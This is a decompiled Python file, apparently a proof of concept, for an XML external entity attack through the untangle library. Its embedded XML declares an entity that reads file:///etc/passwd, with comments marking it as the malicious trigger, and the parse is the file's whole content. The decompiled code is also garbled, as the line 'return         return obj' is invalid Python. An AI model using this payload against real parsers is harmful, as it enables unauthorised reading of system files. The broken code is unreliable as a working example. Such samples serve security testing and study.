# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 244_1.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 611 bytes
import untangle
xml_input = '\n<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">  <!-- This is the malicious part -->\n]>\n<root>\n  <data>&xxe;</data>  <!-- This will trigger the external entity -->\n</root>\n'

def parse_xml(xml_string):
    try:
        obj = untangle.parse(xml_string)
        return         return obj
    except Exception as e:
        try:
            print(f"Error parsing XML: {e}")
        finally:
            e = None
            del e


result = parse_xml(xml_input)
print(result)

# okay decompiling 244_1.pyc
